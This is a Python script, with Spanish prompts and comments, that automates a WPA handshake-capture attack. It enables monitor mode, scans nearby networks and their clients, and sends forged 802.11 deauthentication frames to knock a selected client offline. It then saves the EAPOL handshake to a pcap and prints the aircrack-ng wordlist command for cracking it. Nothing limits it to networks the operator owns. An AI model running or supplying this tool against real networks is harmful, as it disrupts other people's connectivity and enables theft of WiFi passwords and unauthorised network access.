#!/usr/bin/env python3
"""
WiFi Handshake Capture Tool - Interactive Step by Step
Guía el usuario a través de cada paso sin equivocarse
"""

import subprocess
import time
import os
import sys
from datetime import datetime
from scapy.all import sniff, Dot11, RadioTap, wrpcap, Raw
from scapy.layers.dot11 import Dot11Deauth

# Colores para output
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_header(text):
    """Imprimir encabezado"""
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}{text:^70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}\n")

def print_success(text):
    print(f"{Colors.GREEN}✓ {text}{Colors.END}")

def print_info(text):
    print(f"{Colors.BLUE}ℹ {text}{Colors.END}")

def print_warning(text):
    print(f"{Colors.YELLOW}⚠ {text}{Colors.END}")

def print_error(text):
    print(f"{Colors.RED}✗ {text}{Colors.END}")

def check_root():
    """Verificar que se ejecuta con sudo"""
    if os.geteuid() != 0:
        print_error("Este script debe ejecutarse con sudo")
        sys.exit(1)

def enable_monitor_mode(interface):
    """Activar modo monitor"""
    print_info(f"Activando modo monitor en {interface}...")
    
    try:
        # Matar procesos que interfieren
        subprocess.run(["airmon-ng", "check", "kill"], 
                      capture_output=True, timeout=5)
        
        # Activar monitor mode
        result = subprocess.run(["airmon-ng", "start", interface],
                               capture_output=True, text=True, timeout=5)
        
        if result.returncode == 0:
            # Extraer nombre de la interfaz monitor
            for line in result.stdout.split('\n'):
                if 'monitor mode vif enabled' in line:
                    print_success("Modo monitor activado")
                    return True
        
        print_error("No se pudo activar modo monitor")
        return False
    
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def get_monitor_interface():
    """Obtener nombre de interfaz monitor"""
    try:
        result = subprocess.run(["airmon-ng"], 
                               capture_output=True, text=True)
        
        for line in result.stdout.split('\n'):
            if 'monitor mode vif enabled' in line:
                # Extraer nombre (ej: wlan0mon)
                parts = line.split()
                for part in parts:
                    if 'mon' in part:
                        return part
    except:
        pass
    
    return None

def scan_networks(interface):
    """Escanear redes WiFi"""
    print_info(f"Escaneando redes en {interface}...")
    print_info("Esto tomará 5-10 segundos...\n")
    
    networks = []
    
    try:
        # Ejecutar airodump-ng por 10 segundos
        result = subprocess.run(
            ["timeout", "10", "airodump-ng", interface, "-w", "temp_scan"],
            capture_output=True, text=True, timeout=15
        )
        
        # Leer archivo CSV generado
        try:
            with open("temp_scan-01.csv", "r") as f:
                in_stations = False
                for line in f:
                    if in_stations:
                        break
                    
                    # Saltar líneas vacías y encabezados
                    if not line.strip() or "BSSID" in line:
                        continue
                    
                    parts = [p.strip() for p in line.split(",")]
                    
                    if len(parts) >= 14 and ":" in parts[0]:
                        try:
                            network = {
                                'bssid': parts[0],
                                'power': int(parts[1]) if parts[1] else -999,
                                'beacons': int(parts[2]) if parts[2] else 0,
                                'data': int(parts[3]) if parts[3] else 0,
                                'channel': int(parts[4]) if parts[4] else 0,
                                'encryption': parts[5] if len(parts) > 5 else 'OPN',
                                'cipher': parts[6] if len(parts) > 6 else '',
                                'auth': parts[7] if len(parts) > 7 else '',
                                'ssid': parts[13] if len(parts) > 13 else 'Hidden'
                            }
                            
                            # Validar BSSID
                            if network['ssid'] and network['bssid'] != 'BSSID':
                                networks.append(network)
                        except:
                            continue
        except FileNotFoundError:
            print_error("No se pudo leer datos de escaneo")
            return []
        
        # Limpiar archivos temporales
        subprocess.run(["rm", "-f", "temp_scan*"], capture_output=True)
        
        return networks
    
    except Exception as e:
        print_error(f"Error escaneando: {e}")
        return []

def select_network(networks):
    """Mostrar menú para seleccionar red"""
    if not networks:
        print_error("No se encontraron redes")
        return None
    
    print_header("REDES DISPONIBLES")
    
    for idx, net in enumerate(networks, 1):
        ssid = net['ssid'][:30] if net['ssid'] != 'Hidden' else "[OCULTA]"
        power = net['power']
        channel = net['channel']
        enc = net['encryption']
        
        print(f"{Colors.BOLD}{idx:2d}.{Colors.END} SSID: {Colors.BOLD}{ssid:<32}{Colors.END} | "
              f"Canal: {channel:2d} | Potencia: {power:4d}dBm | Enc: {enc}")
    
    while True:
        try:
            choice = input(f"\n{Colors.BOLD}Selecciona el número de tu red (1-{len(networks)}): {Colors.END}")
            idx = int(choice) - 1
            
            if 0 <= idx < len(networks):
                selected = networks[idx]
                print_success(f"Seleccionada: {selected['ssid']} ({selected['bssid']})")
                return selected
            else:
                print_error("Opción inválida")
        except ValueError:
            print_error("Debes ingresar un número")

def scan_clients(bssid, interface):
    """Escanear clientes conectados a una red"""
    print_info(f"Escaneando clientes en {bssid}...")
    print_info("Esto tomará 5-10 segundos...\n")
    
    clients = []
    
    try:
        # Ejecutar airodump-ng específico para esta red
        result = subprocess.run(
            ["timeout", "10", "airodump-ng", "--bssid", bssid, 
             interface, "-w", "temp_clients"],
            capture_output=True, text=True, timeout=15
        )
        
        # Leer archivo CSV
        try:
            with open("temp_clients-01.csv", "r") as f:
                in_stations = False
                for line in f:
                    if "Station MAC" in line:
                        in_stations = True
                        continue
                    
                    if in_stations and line.strip():
                        parts = [p.strip() for p in line.split(",")]
                        
                        if len(parts) >= 6 and ":" in parts[0]:
                            client_mac = parts[0]
                            
                            # No incluir el BSSID como cliente
                            if client_mac.lower() != bssid.lower():
                                client = {
                                    'mac': client_mac,
                                    'first_seen': parts[1],
                                    'last_seen': parts[2],
                                    'packets': int(parts[3]) if parts[3] else 0,
                                    'probe': parts[4] if len(parts) > 4 else ''
                                }
                                clients.append(client)
        except FileNotFoundError:
            print_warning("No se pudo leer lista de clientes")
        
        # Limpiar temporales
        subprocess.run(["rm", "-f", "temp_clients*"], capture_output=True)
        
        return clients
    
    except Exception as e:
        print_error(f"Error escaneando clientes: {e}")
        return []

def select_client(clients, bssid):
    """Mostrar menú para seleccionar cliente"""
    if not clients:
        print_warning("No se encontraron clientes conectados")
        print_info("El handshake se capturará cuando alguien se conecte")
        return None
    
    print_header("CLIENTES CONECTADOS")
    
    for idx, client in enumerate(clients, 1):
        mac = client['mac']
        packets = client['packets']
        print(f"{Colors.BOLD}{idx:2d}.{Colors.END} MAC: {Colors.BOLD}{mac}{Colors.END} | "
              f"Paquetes: {packets}")
    
    print(f"{Colors.BOLD}0.{Colors.END} Capturar de cualquier cliente")
    
    while True:
        try:
            choice = input(f"\n{Colors.BOLD}Selecciona cliente (0-{len(clients)}) o 0 para todos: {Colors.END}")
            idx = int(choice)
            
            if idx == 0:
                print_success("Se capturará handshake de cualquier cliente")
                return None
            elif 0 < idx <= len(clients):
                client = clients[idx - 1]
                print_success(f"Seleccionado: {client['mac']}")
                return client
            else:
                print_error("Opción inválida")
        except ValueError:
            print_error("Debes ingresar un número")

def capture_handshake(bssid, client_mac, interface):
    """Capturar handshake WiFi"""
    print_header("CAPTURA DE HANDSHAKE")
    
    captured_packets = []
    handshake_found = False
    handshake_count = 0
    
    def packet_callback(pkt):
        nonlocal captured_packets, handshake_found, handshake_count
        
        if not pkt.haslayer(Dot11):
            return
        
        # Guardar todos los paquetes
        captured_packets.append(pkt)
        
        frame = pkt[Dot11]
        
        # Buscar EAPOL frames (handshake)
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            
            if len(payload) >= 8:
                # EAPOL type
                if payload[0:1] == b'\x02' or payload[0:1] == b'\x01':
                    handshake_found = True
                    handshake_count += 1
                    print(f"  ✓ Frame EAPOL #{handshake_count} capturado ({len(payload)} bytes)")
    
    print(f"Interface: {interface}")
    print(f"Red: {bssid}")
    if client_mac:
        print(f"Cliente: {client_mac}")
    else:
        print(f"Cliente: Cualquiera (esperando handshake)")
    
    print(f"\n{Colors.YELLOW}⏳ Capturando por 30 segundos...{Colors.END}")
    print(f"{Colors.YELLOW}💡 Tip: Si no se captura, ejecuta deauth en otra terminal{Colors.END}\n")
    
    try:
        sniff(
            iface=interface,
            prn=packet_callback,
            filter=f"(type data and subtype data) or (type mgt and subtype deauth)",
            store=False,
            timeout=30
        )
    except KeyboardInterrupt:
        print("\n\n[CAPTURA INTERRUMPIDA POR USUARIO]")
    except Exception as e:
        print_error(f"Error: {e}")
        return None
    
    print(f"\n{Colors.GREEN}{'='*70}{Colors.END}")
    print(f"Paquetes capturados: {len(captured_packets)}")
    
    if handshake_found:
        print_success(f"¡HANDSHAKE ENCONTRADO! ({handshake_count} frames EAPOL)")
    else:
        print_warning("Handshake NO encontrado (intenta forzar reconexión con deauth)")
    
    # Guardar archivo .pcap
    if captured_packets:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"wifi_handshake_{timestamp}.pcap"
        
        wrpcap(filename, captured_packets)
        print_success(f"Archivo guardado: {Colors.BOLD}{filename}{Colors.END}")
        
        # Mostrar información
        print(f"\n{Colors.BLUE}Información del archivo:{Colors.END}")
        print(f"  Tamaño: {os.path.getsize(filename) / 1024:.1f} KB")
        print(f"  BSSID: {bssid}")
        if client_mac:
            print(f"  Cliente: {client_mac}")
        
        return filename
    else:
        print_error("No se capturaron paquetes")
        return None

def deauth_client(bssid, client_mac, interface):
    """Enviar deauth frames para forzar handshake"""
    print_header("ENVIANDO DEAUTH FRAMES")
    
    print(f"Target BSSID: {bssid}")
    print(f"Cliente: {client_mac}")
    print(f"Interface: {interface}\n")
    
    confirm = input(f"{Colors.BOLD}¿Enviar 20 deauth frames? (s/n): {Colors.END}")
    
    if confirm.lower() != 's':
        print_warning("Cancelado")
        return False
    
    try:
        from scapy.all import sendp
        
        print(f"\n{Colors.YELLOW}Enviando frames...{Colors.END}\n")
        
        for i in range(20):
            # Frame: Cliente → Router
            pkt1 = RadioTap() / Dot11(
                addr1=bssid,
                addr2=client_mac,
                addr3=bssid
            ) / Dot11Deauth(reason=7)
            sendp([pkt1], iface=interface, verbose=False)
            
            # Frame: Router → Cliente
            pkt2 = RadioTap() / Dot11(
                addr1=client_mac,
                addr2=bssid,
                addr3=bssid
            ) / Dot11Deauth(reason=7)
            sendp([pkt2], iface=interface, verbose=False)
            
            print(f"  ✓ Frame {i+1}/20 enviado")
            time.sleep(0.1)
        
        print_success("¡Deauth completado!")
        print_info("Tu cliente debe haber reconectado (capturando handshake...)\n")
        return True
    
    except Exception as e:
        print_error(f"Error: {e}")
        return False

def main():
    """Programa principal"""
    print_header("📡 WiFi HANDSHAKE CAPTURE TOOL")
    
    check_root()
    
    # Paso 1: Obtener interfaz
    print_info("Detectando interfaz WiFi...")
    
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        wifi_interface = None
        
        for line in result.stdout.split('\n'):
            if 'wlan' in line or 'wlp' in line:
                parts = line.split()
                if parts:
                    wifi_interface = parts[0]
                    break
        
        if not wifi_interface:
            print_error("No se encontró interfaz WiFi")
            sys.exit(1)
        
        print_success(f"Interfaz encontrada: {wifi_interface}")
    except Exception as e:
        print_error(f"Error: {e}")
        sys.exit(1)
    
    # Paso 2: Activar modo monitor
    if not enable_monitor_mode(wifi_interface):
        sys.exit(1)
    
    time.sleep(2)
    
    # Obtener interfaz monitor
    mon_interface = get_monitor_interface()
    if not mon_interface:
        print_error("No se pudo activar modo monitor")
        sys.exit(1)
    
    print_success(f"Interfaz monitor: {mon_interface}")
    
    # Paso 3: Escanear redes
    networks = scan_networks(mon_interface)
    
    if not networks:
        print_error("No se encontraron redes")
        sys.exit(1)
    
    print_success(f"Se encontraron {len(networks)} redes")
    
    # Paso 4: Seleccionar red
    selected_network = select_network(networks)
    if not selected_network:
        sys.exit(1)
    
    bssid = selected_network['bssid']
    
    # Paso 5: Escanear clientes
    clients = scan_clients(bssid, mon_interface)
    print_success(f"Se encontraron {len(clients)} cliente(s)")
    
    # Paso 6: Seleccionar cliente
    selected_client = select_client(clients, bssid)
    client_mac = selected_client['mac'] if selected_client else None
    
    # Paso 7: Opción de enviar deauth
    if client_mac:
        print_info("Para forzar captura del handshake, se puede enviar deauth")
        send_deauth = input(f"{Colors.BOLD}¿Enviar deauth frames ahora? (s/n): {Colors.END}")
        
        if send_deauth.lower() == 's':
            deauth_client(bssid, client_mac, mon_interface)
            time.sleep(2)
    
    # Paso 8: Capturar handshake
    handshake_file = capture_handshake(bssid, client_mac, mon_interface)
    
    # Final
    print_header("✅ PROCESO COMPLETADO")
    
    if handshake_file:
        print_success(f"Handshake guardado: {handshake_file}")
        print(f"\nPróximo paso: Crackear con aircrack-ng")
        print(f"  aircrack-ng {handshake_file} -w diccionario.txt")
    else:
        print_warning("No se capturó handshake. Intenta de nuevo.")
    
    # Desactivar modo monitor
    print_info("Desactivando modo monitor...")
    subprocess.run(["airmon-ng", "stop", mon_interface], capture_output=True)
    print_success("Listo!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Programa interrumpido por usuario{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Error fatal: {e}")
        sys.exit(1)
